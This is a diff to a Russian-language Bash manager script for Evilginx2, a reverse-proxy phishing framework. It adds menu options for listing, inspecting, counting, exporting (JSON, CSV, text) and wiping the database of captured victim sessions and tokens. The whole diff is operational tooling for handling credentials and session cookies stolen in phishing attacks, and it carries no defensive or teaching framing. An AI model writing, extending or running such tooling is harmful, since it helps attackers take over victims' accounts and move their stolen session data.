@@ -197,13 +197,207 @@ update_evilginx() {
     log "Сервис перезапущен"
 }
 
+# Функции управления сессиями
+
+# Показать все сессии в табличном формате
+show_sessions_table() {
+    log "Список всех сохраненных сессий:"
+    echo ""
+    if [[ -f "/root/evilginx2-data/export_sessions.sh" ]]; then
+        /root/evilginx2-data/export_sessions.sh all table
+    else
+        error "Скрипт экспорта сессий не найден"
+        return 1
+    fi
+}
+
+# Показать детали конкретной сессии
+show_session_details() {
+    echo ""
+    read -p "Введите ID сессии для просмотра: " session_id
+    
+    if [[ ! "$session_id" =~ ^[0-9]+$ ]]; then
+        error "Неверный ID сессии. Введите число."
+        return 1
+    fi
+    
+    log "Детали сессии ID $session_id:"
+    echo ""
+    
+    if [[ -f "/root/evilginx2-data/export_sessions.sh" ]]; then
+        /root/evilginx2-data/export_sessions.sh "$session_id" text
+    else
+        error "Скрипт экспорта сессий не найден"
+        return 1
+    fi
+}
+
+# Показать все сессии с деталями
+show_all_sessions_detailed() {
+    log "Все сессии с подробностями:"
+    echo ""
+    if [[ -f "/root/evilginx2-data/export_sessions.sh" ]]; then
+        /root/evilginx2-data/export_sessions.sh all text
+    else
+        error "Скрипт экспорта сессий не найден"
+        return 1
+    fi
+}
+
+# Экспорт сессий
+export_sessions() {
+    echo ""
+    echo -e "${YELLOW}Форматы экспорта:${NC}"
+    echo -e "${BLUE}1.${NC} JSON - полная структура данных"
+    echo -e "${BLUE}2.${NC} CSV - табличный формат для Excel"
+    echo -e "${BLUE}3.${NC} Text - формат как в EvilGinx2"
+    echo ""
+    read -p "Выберите формат (1-3): " format_choice
+    
+    case $format_choice in
+        1) export_format="json" ;;
+        2) export_format="csv" ;;
+        3) export_format="text" ;;
+        *) 
+            error "Неверный выбор формата"
+            return 1
+            ;;
+    esac
+    
+    echo ""
+    echo -e "${YELLOW}Какие сессии экспортировать:${NC}"
+    echo -e "${BLUE}1.${NC} Все сессии"
+    echo -e "${BLUE}2.${NC} Конкретную сессию по ID"
+    echo ""
+    read -p "Выберите опцию (1-2): " session_choice
+    
+    case $session_choice in
+        1) 
+            session_target="all"
+            ;;
+        2) 
+            read -p "Введите ID сессии: " session_id
+            if [[ ! "$session_id" =~ ^[0-9]+$ ]]; then
+                error "Неверный ID сессии"
+                return 1
+            fi
+            session_target="$session_id"
+            ;;
+        *) 
+            error "Неверный выбор"
+            return 1
+            ;;
+    esac
+    
+    # Определить имя файла для экспорта
+    timestamp=$(date +"%Y%m%d_%H%M%S")
+    if [[ "$session_target" == "all" ]]; then
+        export_file="/root/evilginx2-data/export_all_sessions_${timestamp}.${export_format}"
+    else
+        export_file="/root/evilginx2-data/export_session_${session_target}_${timestamp}.${export_format}"
+    fi
+    
+    log "Экспорт сессий в файл: $export_file"
+    
+    if [[ -f "/root/evilginx2-data/export_sessions.sh" ]]; then
+        /root/evilginx2-data/export_sessions.sh "$session_target" "$export_format" > "$export_file"
+        if [[ $? -eq 0 ]]; then
+            success "Сессии успешно экспортированы в: $export_file"
+            echo ""
+            echo -e "${YELLOW}Размер файла:${NC} $(ls -lh "$export_file" | awk '{print $5}')"
+        else
+            error "Ошибка при экспорте сессий"
+            rm -f "$export_file" 2>/dev/null
+        fi
+    else
+        error "Скрипт экспорта сессий не найден"
+        return 1
+    fi
+}
+
+# Показать статистику сессий
+show_sessions_stats() {
+    log "Статистика сохраненных сессий:"
+    echo ""
+    
+    if [[ ! -f "/root/evilginx2-data/data.db" ]]; then
+        warning "База данных сессий не найдена"
+        return 1
+    fi
+    
+    db_size=$(ls -lh /root/evilginx2-data/data.db | awk '{print $5}')
+    echo -e "${BLUE}Размер базы данных:${NC} $db_size"
+    
+    if [[ -f "/root/evilginx2-data/export_sessions.sh" ]]; then
+        # Подсчет общего количества сессий
+        total_sessions=$(/root/evilginx2-data/export_sessions.sh all csv 2>/dev/null | tail -n +2 | wc -l)
+        echo -e "${BLUE}Всего сессий:${NC} $total_sessions"
+        
+        # Подсчет сессий с захваченными токенами
+        captured_sessions=$(/root/evilginx2-data/export_sessions.sh all table 2>/dev/null | grep -c "captured" || echo "0")
+        echo -e "${BLUE}Сессии с токенами:${NC} $captured_sessions"
+        
+        # Показать последнюю активность
+        if [[ $total_sessions -gt 0 ]]; then
+            echo ""
+            log "Последние сессии:"
+            /root/evilginx2-data/export_sessions.sh all table | tail -n 6
+        fi
+    else
+        error "Скрипт экспорта не найден"
+    fi
+}
+
+# Очистка старых сессий
+cleanup_sessions() {
+    log "Управление базой данных сессий"
+    echo ""
+    
+    if [[ ! -f "/root/evilginx2-data/data.db" ]]; then
+        warning "База данных сессий не найдена"
+        return 1
+    fi
+    
+    db_size=$(ls -lh /root/evilginx2-data/data.db | awk '{print $5}')
+    echo -e "${YELLOW}Текущий размер базы:${NC} $db_size"
+    
+    echo ""
+    echo -e "${RED}ВНИМАНИЕ! Эта операция удалит ВСЕ сохраненные сессии!${NC}"
+    echo -e "${YELLOW}Рекомендуется сначала сделать экспорт важных данных.${NC}"
+    echo ""
+    read -p "Вы уверены, что хотите очистить базу сессий? (введите 'YES' для подтверждения): " confirm
+    
+    if [[ "$confirm" == "YES" ]]; then
+        # Создать резервную копию
+        backup_file="/root/evilginx2-data/data.db.backup.$(date +%Y%m%d_%H%M%S)"
+        cp /root/evilginx2-data/data.db "$backup_file"
+        log "Резервная копия создана: $backup_file"
+        
+        # Очистить базу данных
+        rm -f /root/evilginx2-data/data.db
+        success "База данных сессий очищена"
+        
+        # Перезапустить evilginx2 для создания новой пустой базы
+        if systemctl is-active --quiet evilginx2; then
+            log "Перезапуск сервиса для создания новой базы..."
+            systemctl restart evilginx2
+            sleep 2
+            if [[ -f "/root/evilginx2-data/data.db" ]]; then
+                success "Новая база данных создана"
+            fi
+        fi
+    else
+        log "Операция отменена"
+    fi
+}
 # Показать меню
 show_menu() {
     echo -e "${GREEN}"
-    echo "=========================================="
+    echo "==========================================="
     echo "         Evilginx2 Manager"
-    echo "=========================================="
+    echo "==========================================="
     echo -e "${NC}"
+    echo -e "${BLUE}=== Управление сервисом ===${NC}"
     echo -e "${BLUE}1.${NC} Показать статус сервиса"
     echo -e "${BLUE}2.${NC} Запустить сервис"
     echo -e "${BLUE}3.${NC} Остановить сервис"
@@ -213,9 +407,20 @@ show_menu() {
     echo -e "${BLUE}7.${NC} Показать логи"
     echo -e "${BLUE}8.${NC} Следить за логами"
     echo -e "${BLUE}9.${NC} Запустить интерактивно"
+    echo ""
+    echo -e "${GREEN}=== Управление сессиями ===${NC}"
+    echo -e "${BLUE}13.${NC} Показать список сессий"
+    echo -e "${BLUE}14.${NC} Детали конкретной сессии"
+    echo -e "${BLUE}15.${NC} Все сессии с деталями"
+    echo -e "${BLUE}16.${NC} Экспорт сессий в файл"
+    echo -e "${BLUE}17.${NC} Статистика сессий"
+    echo -e "${BLUE}18.${NC} Очистить базу сессий"
+    echo ""
+    echo -e "${YELLOW}=== Конфигурация ===${NC}"
     echo -e "${BLUE}10.${NC} Показать конфигурацию"
     echo -e "${BLUE}11.${NC} Показать phishlets"
     echo -e "${BLUE}12.${NC} Обновить Evilginx2"
+    echo ""
     echo -e "${BLUE}0.${NC} Выход"
     echo
 }
@@ -239,6 +444,12 @@ main() {
         "config") show_config ;;
         "phishlets") show_phishlets ;;
         "update") update_evilginx ;;
+        "sessions") show_sessions_table ;;
+        "session") show_session_details ;;
+        "sessions-all") show_all_sessions_detailed ;;
+        "export") export_sessions ;;
+        "stats") show_sessions_stats ;;
+        "cleanup") cleanup_sessions ;;
         *)
             # Интерактивное меню
             while true; do
@@ -258,6 +469,12 @@ main() {
                     10) show_config ;;
                     11) show_phishlets ;;
                     12) update_evilginx ;;
+                    13) show_sessions_table ;;
+                    14) show_session_details ;;
+                    15) show_all_sessions_detailed ;;
+                    16) export_sessions ;;
+                    17) show_sessions_stats ;;
+                    18) cleanup_sessions ;;
                     0) 
                         log "Выход..."
                         exit 0
